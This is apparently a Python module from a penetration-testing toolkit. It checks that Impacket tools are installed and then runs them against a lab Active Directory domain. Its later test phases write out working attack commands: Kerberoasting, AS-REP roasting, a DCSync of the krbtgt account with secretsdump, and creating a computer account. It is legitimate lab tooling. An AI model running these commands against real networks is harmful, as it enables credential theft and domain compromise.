"""
Impacket Tool Validation Module
Validates that all impacket tools are available and functional
against the Iron Throne lab (westeros.local)
"""

import os
import re
from typing import List, Dict, Tuple
from core.module_base import ModuleBase, ModuleType, Platform, find_tool


class ImpacketValidate(ModuleBase):
    """
    Validates impacket tool availability and functionality.
    Tests each tool against a target AD environment to ensure
    correct installation and expected output.

    Designed as the primary test bench for uwu-toolkit impacket integration.
    """

    def __init__(self):
        super().__init__()
        self.name = "impacket_validate"
        self.description = "Validate impacket tools - test bench for uwu-toolkit"
        self.author = "UwU Toolkit"
        self.version = "1.0.0"
        self.module_type = ModuleType.AUXILIARY
        self.platform = Platform.WINDOWS
        self.tags = ["ad", "impacket", "validate", "test", "bench", "iron_throne"]
        self.references = [
            "https://github.com/fortra/impacket",
        ]

        # Core options
        self.register_option("RHOSTS", "Domain Controller IP", required=True)
        self.register_option("DOMAIN", "Domain name", required=True)
        self.register_option("USER", "Domain username for authenticated tests", required=True)
        self.register_option("PASS", "Domain password", required=True)
        self.register_option("DA_USER", "Domain Admin username (for privileged tests)", default="")
        self.register_option("DA_PASS", "Domain Admin password", default="")
        self.register_option("TARGET_HOST", "Secondary target host (workstation)", default="")
        self.register_option("SQL_USER", "MSSQL username", default="")
        self.register_option("SQL_PASS", "MSSQL password", default="")

        # Test control
        self.register_option("MODE", "Test mode: tools_only, auth, full",
                           default="tools_only",
                           choices=["tools_only", "auth", "full"])
        self.register_option("VERBOSE", "Verbose output", default="no",
                           choices=["yes", "no"])

    # All impacket tools we care about
    IMPACKET_TOOLS = [
        # Enumeration
        ("GetUserSPNs.py", "Kerberoasting"),
        ("GetNPUsers.py", "AS-REP Roasting"),
        ("getTGT.py", "Request TGT"),
        ("getST.py", "Request service ticket (S4U)"),
        ("findDelegation.py", "Find delegation configs"),
        ("lookupsid.py", "SID brute-force"),
        ("samrdump.py", "SAM Remote Interface dump"),
        ("rpcdump.py", "RPC endpoint dump"),
        ("Get-GPPPassword.py", "GPP password extraction"),
        ("GetLAPSPassword.py", "LAPS password retrieval"),
        # Execution
        ("psexec.py", "PsExec-style execution"),
        ("smbexec.py", "SMB-based execution"),
        ("wmiexec.py", "WMI-based execution"),
        ("dcomexec.py", "DCOM-based execution"),
        ("atexec.py", "Task Scheduler execution"),
        # Credential dumping
        ("secretsdump.py", "Secret dumping (SAM/NTDS/LSA)"),
        # Lateral movement
        ("smbclient.py", "SMB client"),
        ("mssqlclient.py", "MSSQL client"),
        # Ticket manipulation
        ("ticketer.py", "Golden/Silver ticket forging"),
        ("ticketConverter.py", "Ticket format conversion"),
        # ACL/Object manipulation
        ("dacledit.py", "DACL editing"),
        ("owneredit.py", "Owner editing"),
        ("addcomputer.py", "Add computer account"),
        ("rbcd.py", "RBCD delegation config"),
        ("dpapi.py", "DPAPI secrets extraction"),
        # Relay
        ("ntlmrelayx.py", "NTLM relay"),
    ]

    def run(self) -> bool:
        mode = self.get_option("MODE")
        verbose = self.get_option("VERBOSE") == "yes"

        self.print_status("Impacket Tool Validation — uwu-toolkit Test Bench")
        self.print_line("=" * 60)

        results = {"pass": [], "fail": [], "skip": []}

        # Phase 1: Tool availability
        self.print_line()
        self.print_status("Phase 1: Tool Availability")
        self.print_line("-" * 40)
        self._check_tools(results, verbose)

        if mode == "tools_only":
            self._print_summary(results)
            return len(results["fail"]) == 0

        # Phase 2: Authentication tests (requires live lab)
        self.print_line()
        self.print_status("Phase 2: Authentication & Enumeration")
        self.print_line("-" * 40)
        self._test_auth(results, verbose)

        if mode == "auth":
            self._print_summary(results)
            return len(results["fail"]) == 0

        # Phase 3: Full functional tests
        self.print_line()
        self.print_status("Phase 3: Full Functional Tests")
        self.print_line("-" * 40)
        self._test_full(results, verbose)

        self._print_summary(results)
        return len(results["fail"]) == 0

    def _check_tools(self, results: Dict, verbose: bool):
        """Check if all impacket tools can be found"""
        for tool_name, description in self.IMPACKET_TOOLS:
            path = find_tool(tool_name)
            if path:
                results["pass"].append(f"[FOUND] {tool_name}")
                if verbose:
                    self.print_good(f"{tool_name:<25} {path}")
                else:
                    self.print_good(f"{tool_name:<25} OK")
            else:
                # Try in Exegol
                ret, stdout, stderr = self.run_in_exegol(f"which {tool_name}", timeout=10)
                if ret == 0 and stdout.strip():
                    results["pass"].append(f"[FOUND-EXEGOL] {tool_name}")
                    if verbose:
                        self.print_good(f"{tool_name:<25} {stdout.strip()} (exegol)")
                    else:
                        self.print_good(f"{tool_name:<25} OK (exegol)")
                else:
                    results["fail"].append(f"[MISSING] {tool_name} — {description}")
                    self.print_error(f"{tool_name:<25} NOT FOUND")

        # Version check
        self.print_line()
        ret, stdout, stderr = self.run_in_exegol("pip3 show impacket 2>/dev/null || pip show impacket 2>/dev/null", timeout=15)
        output = stdout + stderr
        version_match = re.search(r'Version:\s+(.+)', output)
        if version_match:
            self.print_status(f"Impacket version: {version_match.group(1).strip()}")
        else:
            # Try direct import
            ret2, stdout2, stderr2 = self.run_in_exegol(
                "python3 -c 'import impacket; print(impacket.__version__)' 2>/dev/null || "
                "python3 -c 'import impacket; print(\"installed\")' 2>/dev/null",
                timeout=10
            )
            if ret2 == 0 and stdout2.strip():
                self.print_status(f"Impacket version: {stdout2.strip()}")
            else:
                self.print_warning("Could not determine impacket version")

    def _test_auth(self, results: Dict, verbose: bool):
        """Test tool authentication against the lab"""
        dc_ip = self.get_option("RHOSTS")
        domain = self.get_option("DOMAIN")
        user = self.get_option("USER")
        password = self.get_option("PASS")

        auth_tests = [
            (
                "GetUserSPNs.py",
                f"GetUserSPNs.py '{domain}/{user}:{password}' -dc-ip {dc_ip}",
                ["ServicePrincipalName", "$krb5tgs$", "SPN"],
                ["error", "KDC_ERR", "STATUS_LOGON_FAILURE"]
            ),
            (
                "GetNPUsers.py",
                f"GetNPUsers.py '{domain}/{user}:{password}' -dc-ip {dc_ip}",
                ["UF_DONT_REQUIRE_PREAUTH", "$krb5asrep$", "Name"],
                ["error", "KDC_ERR", "STATUS_LOGON_FAILURE"]
            ),
            (
                "getTGT.py",
                f"getTGT.py '{domain}/{user}:{password}' -dc-ip {dc_ip}",
                [".ccache", "Saving ticket", "TGT"],
                ["KDC_ERR", "STATUS_LOGON_FAILURE"]
            ),
            (
                "lookupsid.py",
                f"lookupsid.py '{domain}/{user}:{password}'@{dc_ip}",
                ["SidTypeUser", "SidTypeDomain", "500"],
                ["STATUS_LOGON_FAILURE", "error"]
            ),
            (
                "rpcdump.py",
                f"rpcdump.py '{domain}/{user}:{password}'@{dc_ip}",
                ["Protocol", "Provider", "ncacn"],
                ["STATUS_LOGON_FAILURE", "error"]
            ),
            (
                "samrdump.py",
                f"samrdump.py '{domain}/{user}:{password}'@{dc_ip}",
                ["Found user", "domain"],
                ["STATUS_LOGON_FAILURE", "error"]
            ),
            (
                "smbclient.py",
                f"smbclient.py '{domain}/{user}:{password}'@{dc_ip} -c 'shares'",
                ["ADMIN$", "C$", "IPC$", "NETLOGON", "SYSVOL"],
                ["STATUS_LOGON_FAILURE", "error"]
            ),
            (
                "findDelegation.py",
                f"findDelegation.py '{domain}/{user}:{password}' -dc-ip {dc_ip}",
                ["AccountName", "Constrained", "Unconstrained", "delegation"],
                ["STATUS_LOGON_FAILURE", "error"]
            ),
            (
                "Get-GPPPassword.py",
                f"Get-GPPPassword.py '{domain}/{user}:{password}'@{dc_ip}",
                ["cpassword", "Found", "userName", "password"],
                ["STATUS_LOGON_FAILURE"]
            ),
        ]

        for tool_name, cmd, success_markers, fail_markers in auth_tests:
            self.print_status(f"Testing {tool_name}...")
            ret, stdout, stderr = self.run_in_exegol(cmd, timeout=60)
            output = (stdout + stderr).lower()

            # Check for failure indicators first
            failed = False
            for marker in fail_markers:
                if marker.lower() in output and not any(s.lower() in output for s in success_markers):
                    results["fail"].append(f"[AUTH-FAIL] {tool_name}: {marker}")
                    self.print_error(f"{tool_name:<25} FAILED — {marker}")
                    if verbose:
                        self.print_line(f"    stdout: {stdout[:200]}")
                        self.print_line(f"    stderr: {stderr[:200]}")
                    failed = True
                    break

            if not failed:
                # Check for success indicators
                found_success = any(s.lower() in output for s in success_markers)
                if found_success or ret == 0:
                    results["pass"].append(f"[AUTH-OK] {tool_name}")
                    self.print_good(f"{tool_name:<25} PASS")
                    if verbose:
                        self.print_line(f"    Output preview: {stdout[:150]}")
                else:
                    results["skip"].append(f"[AUTH-UNCLEAR] {tool_name}: no success/fail markers")
                    self.print_warning(f"{tool_name:<25} UNCLEAR (ret={ret})")
                    if verbose:
                        self.print_line(f"    stdout: {stdout[:200]}")
                        self.print_line(f"    stderr: {stderr[:200]}")

    def _test_full(self, results: Dict, verbose: bool):
        """Full functional tests requiring higher privileges"""
        dc_ip = self.get_option("RHOSTS")
        domain = self.get_option("DOMAIN")
        user = self.get_option("USER")
        password = self.get_option("PASS")
        da_user = self.get_option("DA_USER") or user
        da_pass = self.get_option("DA_PASS") or password
        target_host = self.get_option("TARGET_HOST") or dc_ip
        sql_user = self.get_option("SQL_USER")
        sql_pass = self.get_option("SQL_PASS")

        # Kerberoast with hash retrieval
        self.print_status("Testing Kerberoast (hash retrieval)...")
        ret, stdout, stderr = self.run_in_exegol(
            f"GetUserSPNs.py '{domain}/{user}:{password}' -dc-ip {dc_ip} -request",
            timeout=60
        )
        output = stdout + stderr
        if "$krb5tgs$" in output:
            hash_count = output.count("$krb5tgs$")
            results["pass"].append(f"[KERBEROAST] Got {hash_count} TGS hash(es)")
            self.print_good(f"Kerberoast: {hash_count} TGS hash(es) retrieved")
        else:
            results["skip"].append("[KERBEROAST] No hashes (may have no SPN users)")
            self.print_warning("Kerberoast: no TGS hashes retrieved")

        # AS-REP Roast with hash retrieval
        self.print_status("Testing AS-REP Roast (hash retrieval)...")
        ret, stdout, stderr = self.run_in_exegol(
            f"GetNPUsers.py '{domain}/' -dc-ip {dc_ip} -usersfile /dev/stdin <<< '{user}'",
            timeout=30
        )
        # Also try authenticated mode
        ret2, stdout2, stderr2 = self.run_in_exegol(
            f"GetNPUsers.py '{domain}/{user}:{password}' -dc-ip {dc_ip} -request",
            timeout=60
        )
        output_all = stdout + stderr + stdout2 + stderr2
        if "$krb5asrep$" in output_all:
            results["pass"].append("[ASREPROAST] Got AS-REP hash(es)")
            self.print_good("AS-REP Roast: hash(es) retrieved")
        elif "UF_DONT_REQUIRE_PREAUTH" in output_all or ret2 == 0:
            results["pass"].append("[ASREPROAST] Tool works (no vulnerable users or hashes)")
            self.print_good("AS-REP Roast: tool functional")
        else:
            results["skip"].append("[ASREPROAST] Unclear result")
            self.print_warning("AS-REP Roast: unclear result")

        # secretsdump (requires DA or high-priv creds)
        if da_user and da_pass:
            self.print_status("Testing secretsdump (requires DA)...")
            ret, stdout, stderr = self.run_in_exegol(
                f"secretsdump.py '{domain}/{da_user}:{da_pass}'@{dc_ip} -just-dc-user krbtgt",
                timeout=120
            )
            output = stdout + stderr
            if "krbtgt" in output.lower() and ":::" in output:
                results["pass"].append("[SECRETSDUMP] DCSync krbtgt OK")
                self.print_good("secretsdump: DCSync krbtgt successful")
            elif "STATUS_LOGON_FAILURE" in output:
                results["fail"].append("[SECRETSDUMP] Auth failed")
                self.print_error("secretsdump: authentication failed")
            else:
                results["skip"].append("[SECRETSDUMP] Unclear (may need DA creds)")
                self.print_warning("secretsdump: unclear result")

        # addcomputer + rbcd chain
        self.print_status("Testing addcomputer.py...")
        test_pc = "UWUTEST$"
        test_pass = "UwUBenchTest123!"
        ret, stdout, stderr = self.run_in_exegol(
            f"addcomputer.py '{domain}/{user}:{password}' -computer-name UWUTEST -computer-pass '{test_pass}' -dc-ip {dc_ip}",
            timeout=30
        )
        output = stdout + stderr
        if "successfully added" in output.lower() or "already exists" in output.lower():
            results["pass"].append("[ADDCOMPUTER] Computer account creation OK")
            self.print_good("addcomputer: functional")
        elif "STATUS_LOGON_FAILURE" in output:
            results["fail"].append("[ADDCOMPUTER] Auth failed")
            self.print_error("addcomputer: auth failed")
        else:
            results["skip"].append(f"[ADDCOMPUTER] {output[:80]}")
            self.print_warning(f"addcomputer: {output[:80]}")

        # dacledit (read mode only — non-destructive)
        self.print_status("Testing dacledit.py (read mode)...")
        ret, stdout, stderr = self.run_in_exegol(
            f"dacledit.py -action read -target '{user}' '{domain}/{user}:{password}' -dc-ip {dc_ip}",
            timeout=30
        )
        output = stdout + stderr
        if ret == 0 or "ACE" in output or "DACL" in output.upper() or "ObjectType" in output:
            results["pass"].append("[DACLEDIT] Read ACL OK")
            self.print_good("dacledit: functional (read mode)")
        else:
            results["skip"].append("[DACLEDIT] Unclear result")
            self.print_warning(f"dacledit: unclear (ret={ret})")

        # MSSQL client
        if sql_user and sql_pass:
            self.print_status("Testing mssqlclient.py...")
            ret, stdout, stderr = self.run_in_exegol(
                f"mssqlclient.py '{domain}/{sql_user}:{sql_pass}'@{dc_ip} -windows-auth -Q 'SELECT @@version'",
                timeout=30
            )
            output = stdout + stderr
            if "SQL Server" in output or "Microsoft" in output:
                results["pass"].append("[MSSQL] Connection OK")
                self.print_good("mssqlclient: connected to MSSQL")
            else:
                results["skip"].append("[MSSQL] Could not connect")
                self.print_warning("mssqlclient: could not connect")

        # dpapi (just check the tool runs)
        self.print_status("Testing dpapi.py (help check)...")
        ret, stdout, stderr = self.run_in_exegol("dpapi.py -h", timeout=10)
        if ret == 0 or "usage" in (stdout + stderr).lower():
            results["pass"].append("[DPAPI] Tool runs")
            self.print_good("dpapi: tool functional")
        else:
            results["fail"].append("[DPAPI] Tool failed to run")
            self.print_error("dpapi: failed to execute")

        # ntlmrelayx (just check it starts)
        self.print_status("Testing ntlmrelayx.py (help check)...")
        ret, stdout, stderr = self.run_in_exegol("ntlmrelayx.py -h", timeout=10)
        if ret == 0 or "usage" in (stdout + stderr).lower():
            results["pass"].append("[NTLMRELAYX] Tool runs")
            self.print_good("ntlmrelayx: tool functional")
        else:
            results["fail"].append("[NTLMRELAYX] Tool failed to run")
            self.print_error("ntlmrelayx: failed to execute")

        # ticketer (help check)
        self.print_status("Testing ticketer.py (help check)...")
        ret, stdout, stderr = self.run_in_exegol("ticketer.py -h", timeout=10)
        if ret == 0 or "usage" in (stdout + stderr).lower():
            results["pass"].append("[TICKETER] Tool runs")
            self.print_good("ticketer: tool functional")
        else:
            results["fail"].append("[TICKETER] Tool failed to run")
            self.print_error("ticketer: failed to execute")

    def _print_summary(self, results: Dict):
        """Print validation summary"""
        total = len(results["pass"]) + len(results["fail"]) + len(results["skip"])
        self.print_line()
        self.print_line("=" * 60)
        self.print_status("IMPACKET VALIDATION SUMMARY")
        self.print_line("-" * 40)
        self.print_good(f"PASS:  {len(results['pass'])}/{total}")
        if results["fail"]:
            self.print_error(f"FAIL:  {len(results['fail'])}/{total}")
            for f in results["fail"]:
                self.print_error(f"  {f}")
        if results["skip"]:
            self.print_warning(f"SKIP:  {len(results['skip'])}/{total}")
        self.print_line("=" * 60)

    def check(self) -> bool:
        """Check if impacket is available"""
        tool = find_tool("GetUserSPNs.py")
        if tool:
            return True
        ret, stdout, stderr = self.run_in_exegol("which GetUserSPNs.py", timeout=10)
        return ret == 0
